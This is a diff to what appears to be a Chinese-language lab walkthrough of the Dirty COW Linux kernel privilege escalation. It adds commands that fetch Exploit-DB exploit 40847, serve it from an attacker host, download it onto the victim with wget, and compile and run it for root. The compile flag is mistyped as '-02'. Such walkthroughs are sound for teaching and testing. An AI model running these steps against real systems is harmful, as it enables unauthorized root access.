@@ -198,5 +198,20 @@ Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege 
 ---
    
     檢查kernal版本是否在漏洞版本區間
-![image](https://github.com/user-attachments/assets/200647a6-0081-45d5-a602-9848582b8d3b)
+![image](https://github.com/user-attachments/assets/76baa4a9-0e20-4038-b40f-b420672eb7a9)
+
+    下載40847漏洞的檔案並上傳到受害端電腦
+    searchsploit -m 40847
+    sudo python3 -m http.server 80
+    wget 192.168.0.18/40847.cpp
+![image](https://github.com/user-attachments/assets/ffdf1d60-fe71-456e-a774-291b3544f2fc)
+
+    編譯40847.cpp檔案並執行
+    g++ -Wall -pedantic -02 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+    ./dcow -s
+![image](https://github.com/user-attachments/assets/e62583cf-12ec-448b-9f07-986a731878f3)
+![image](https://github.com/user-attachments/assets/ff2627b9-e579-4a5d-9114-564d029dd380)
+
+
+
 
